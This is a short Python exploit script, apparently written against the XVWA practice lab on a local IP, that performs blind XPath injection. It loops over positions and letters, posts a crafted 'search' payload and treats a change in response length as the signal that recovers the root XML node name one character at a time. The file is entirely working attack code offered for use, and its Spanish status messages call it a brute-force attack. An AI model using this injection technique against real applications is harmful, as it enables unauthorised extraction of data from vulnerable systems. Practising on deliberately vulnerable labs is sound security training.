from pwn import *
import requests
import time
import sys
import signal
import string
import pdb

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

main_url = "http://192.168.0.70/xvwa/vulnerabilities/xpath/"
characters = string.ascii_letters

def xPathInjection():
    data = ""

    p1 = log.progress("Fuerza Bruta")
    p1.status("Iniciando proceso de fuerza bruta")
    time.sleep(2)
    p2 = log.progress("Data")

    for position in range(1, 8):
        for character in characters:
            post_data = {
                'search': "1' and substring(name(/*[1]),%d,1)='%s'" % (position, character),
                'submit': ''
            }
            r = requests.post(main_url, data=post_data)
            print (len(r.text))
            if (len(r.text) != 8614):
                
                data += character
                p2.status(data)
                break
    p1.success("Ataque concluido")
    p2.success(data)

if __name__ == '__main__':
    xPathInjection()
